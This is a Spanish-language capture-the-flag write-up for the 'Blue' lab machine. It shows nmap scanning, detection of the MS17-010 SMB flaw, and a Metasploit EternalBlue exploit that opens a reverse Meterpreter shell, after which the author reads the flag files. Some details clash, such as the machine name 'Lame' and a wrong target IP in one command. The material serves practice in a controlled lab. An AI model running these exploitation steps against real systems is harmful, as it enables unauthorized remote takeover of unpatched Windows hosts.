Creamos los directorio de trabajo con el nombre de la maquina en nuestro caso Lame

```ruby
mkdir Blue
```

## Reconocimiento de Puertos

Lanzamos un ping para comprobar que tenemos conexión desde nuestra maquina 

```ruby
ping 10.10.10.40
```

Comprobamos la versión del sistema operativo que tenemos si tenemos un ttl de 127 se trata de una maquina windows.

### Reconocimientos Nmap

Lanzamos la herramienta Nmap para ver los puertos disponibles que se encuentran abiertos,
es un escaneo agresivo ya que estamos en un entorno controlado

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

La salida la ponemos en un archivo con formato grepeable para poder buscar luego 

Los puertos son los siguientes:

```ruby
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

```

Realizamos un escaneo mas exhaustivo para comprobar que versión corre en ese puerto

```ruby
nmap --script=firewall-bypass -p135,139,445,49152,49153,49154,49155,49157 -vvv -oN targeted 10.10.10.40
```

```ruby

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```

vemos que podemos explotar la vulnerabilidad eternalblue en la máquina lo podemos de hacer de varias formas yo voy con metasploit que es la forma mas sencilla .


## Explotamos MS17-010

Para ello primero de todo vamos a metasploit y buscamos aquello referente con el codigo 


```ruby
searchsploit ms17-010
```

Encontramos las siguientes vulnerabilidades

``` ruby
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14   average  Yes
```

Podemos ver que si lo ejecutamos nos lanza una shell meterpreter, por lo tanto vamos a configurarlo para intentar explotar el fallo

```ruby
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.10.14.13
LHOST => 10.10.14.13

msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```


Explotamos el exploit:

```ruby 
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
.....
[*] Meterpreter session 2 opened (10.10.14.13:4444 -> 10.10.10.40:49164) at 2023-06-28 09:20:26 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Finalmente podemos comprobar que lo explotamos con éxito.
```ruby
meterpreter > ls
Listing: C:\Windows\system32
...
```

### Tratamiento de TTY de meterpreter 

Como no me gusta la terminal de meterpreter porque es un poco precaria voy a tunearla para que sea parecida a la de windows

Para ello vamos a ejecutar el siguiente comando 

```ruby 
meterpreter > execute -c -f cmd.exe -H -i -d
```

Con esto tenemos una shell como la de windows 

```ruby 
Process 1820 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```



#### Buscamos las flag

Para encontrar las flags vamos al directorio raíz y a partir de ahí realizamos una búsqueda 
recursiva usamos el siguiente comando.

```ruby
dir /s /b root.txt user.txt
```
Nos devuelve dos ficheros que existen en el equipo en los siguientes directorios 

```ruby
C:\Users\Administrator\Desktop\root.txt
C:\Users\haris\Desktop\user.txt
```

Para ver las flags usamos el siguiente comando (es similar al cat)

```ruby 
type C:\Users\Administrator\Desktop\root.txt
```